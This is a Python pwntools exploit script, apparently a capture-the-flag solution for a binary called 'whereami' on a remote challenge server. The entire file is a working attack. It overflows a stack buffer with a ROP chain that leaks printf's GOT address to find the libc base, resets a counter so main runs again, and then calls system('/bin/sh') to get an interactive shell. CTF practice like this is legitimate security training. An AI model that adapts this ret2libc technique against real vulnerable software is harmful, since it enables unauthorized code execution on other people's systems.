from pwn import *

context.log_level = 'DEBUG'
context.binary = elf = ELF('./whereami')
libc = ELF('libc.so.6')

io = remote('challs.actf.co', 31222)
# io = process('./whereami')
POP_RDI = 0x401303

to_fill = 0x40 + 8

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
main = elf.symbols['main']

# leak printf GOT address
printf_got = elf.got['printf']
rop.puts(elf.got.printf)

# overwrite counter BSS
counter = 0x40406C
rop.gets(counter)  # overwrite this with 0 later

payload = b'A' * to_fill + rop.chain() + p64(ret) + p64(main)
io.recvuntil(b'Who are you? ')
io.sendline(payload)

io.recvline()
leak = u64(io.recvline().strip().ljust(8, b'\x00'))

print('printf GOT leak:', hex(leak))
libc_printf_offset = libc.symbols['printf']
libc_system_offset = libc.symbols['system']
BIN_SH_offset_searched = next(libc.search(b"/bin/sh"))

libc_base = leak - libc_printf_offset
libc_system = libc_base + libc_system_offset
libc_BIN_SH = libc_base + BIN_SH_offset_searched
print('libc base:', hex(libc_base))
print('system:', hex(libc_system))
print('binsh:', hex(libc_BIN_SH))

io.sendline(p64(0x0))  # overwrite counter with 0 so we can call main again

payload = b'A' * to_fill + p64(POP_RDI) + p64(libc_BIN_SH) + p64(ret) + p64(libc_system)  # ret here is needed cuz of movaps issue
print(payload)
io.sendline(payload)
io.interactive()
